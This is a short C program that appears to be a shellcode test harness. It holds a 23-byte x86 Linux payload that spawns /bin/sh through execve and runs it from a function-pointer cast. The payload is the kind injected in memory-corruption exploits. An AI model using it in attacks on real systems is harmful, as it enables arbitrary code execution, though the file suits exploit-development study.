#include <stdio.h>
#include <string.h>

unsigned char shellcode[] = "\x31\xc9\x31\xd2\x52\x68\x6e"
                            "\x2f\x73\x68\x68\x2f\x2f\x62"
                            "\x69\x89\xe3\x31\xc0\xb0\x0b"
                            "\xcd\x80";

int main(void) {
  printf("[*] shellcode length: %d\n", strlen(shellcode));
  (*(void (*)())shellcode)();
  return 0;
}

